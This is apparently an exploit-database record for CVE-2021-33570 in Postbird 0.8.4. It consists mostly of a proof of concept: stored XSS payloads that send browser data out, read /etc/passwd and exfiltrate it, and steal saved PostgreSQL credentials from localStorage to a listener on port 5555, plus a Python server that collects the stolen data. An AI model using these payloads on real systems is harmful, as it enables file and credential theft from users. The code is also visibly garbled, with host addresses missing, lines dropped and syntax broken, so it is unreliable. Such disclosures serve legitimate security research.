{
    "text": "vul_name : Postbird 0.8.4 Cross Site Scripting / Local File Inclusion ， vul_cve : CVE-2021-33570 ， vul_poc :  # Exploit Title : Postbird 0.8.4 - Javascript Injection ，  # Date :  [ 26 May 2021 ]  ，  # Exploit Author : Debshubra Chakraborty ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : 0.8.4 ，  # Tested on : Linux ，  # CVE : CVE-2021-33570 ， \" ， XSS Payload ， <img src=\" onerror=\"var xhttp = new XMLHttpRequest (  )  ; xhttp.open ( 'GET' , ' : 5555/?xss='+JSON.stringify ( navigator.appVersion )  , true )  ; xhttp.send (  )  ; \"> ， LFI Payload ， <img src=\" onerror=\"var xhttp = new XMLHttpRequest (  )  ; xhttp.open ( 'GET' , 'file : /etc/passwd' , false )  ; xhttp.send (  )  ; var res = xhttp.response ; xhttp.open ( 'GET' , ' : 5555/?file='+JSON.stringify ( res )  , true )  ; xhttp.send (  )  ; \"> ， PostgreSQL Password Stealing Payload ， <img src=\" onerror=\"var xhttp = new XMLHttpRequest (  )  ; xhttp.open ( 'GET' , ' : 5555/?credentials='+window.localStorage.savedConnections , true )  ; xhttp.send (  )  ; \"> ， \" ， from http.server import BaseHTTPRequestHandler , HTTPServer ， hostName = '0.0.0.0' ， serverPort = 5555 ， class MyServer ( BaseHTTPRequestHandler )  :  ， self.send_response ( 200 )  ， parse ( urllib.parse.unquote ( self.requestline )  ， expression = re.search ( '\\S+=' , data )  ， attr = expression.group (  )  ， data = data [ 12 : len ( data ) -11 ]  ， data = data.rsplit ( '\\n' )  ， print ( f'\\n [ + ] File received from LFI : \\n\\n' )  ， print ( output )  ， elif attr [ 2 : len ( attr ) -1 ] = 'xss' :  ， data = data [ 11 : len ( data ) -10 ]  ， print ( f'\\n [ + ] Data exfiltration from Stored XSS : \\n\\n{data}' )  ， elif attr [ 2 : len ( attr ) -1 ] = 'credentials' :  ， pos = re.search ( '{\"\\S+ : ' , data )  ， data = data [ pos.start (  )  : len ( data ) -11 ]  ， pos = i ， host = data [ 2 : pos ]  ， data = data [ 14 :  ]  ， data = data.rsplit ( ' , ' )  ， print ( f'\\n\\n [ + ] The Database credentials received\\n\\nHost = {host}' )  ， print ( output )  ， print ( f'\\n\\n [ - ] Unknown header attribute found , atribute = {attr [ 2 : len ( attr ) -1 ] }' )  ， global hostName , serverPort ， webServer = HTTPServer ( hostName , serverPort )  , MyServer )  ， print ( \"Server started % ( hostName , serverPort )  ， webServer.serve_forever (  )  ， pass ， webServer.server_close (  )  ， print ( \"\\nServer stopped.\" )  ， main (  ) ",
    "time": "2021.05.27"
}